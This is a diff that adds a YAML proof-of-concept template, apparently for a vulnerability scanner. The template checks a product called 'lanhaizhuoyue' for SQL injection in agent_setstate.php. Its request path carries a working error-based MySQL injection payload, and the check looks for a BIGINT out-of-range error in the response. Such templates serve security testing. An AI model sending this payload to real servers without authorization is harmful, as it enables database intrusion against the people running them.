@@ -1,0 +1,15 @@
+name: poc-yaml-lanhaizhuoyue-agentsetstate-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /agent_setstate.php?id=(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x717a767071,(SELECT%20(ELT(6154=6154,1))),0x7170716a71,0x78))s),%208446744073709551610,%208446744073709551610)))
+    expression: response.status == 200 && response.body.bcontains(b'BIGINT value is out of range in')
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139184285
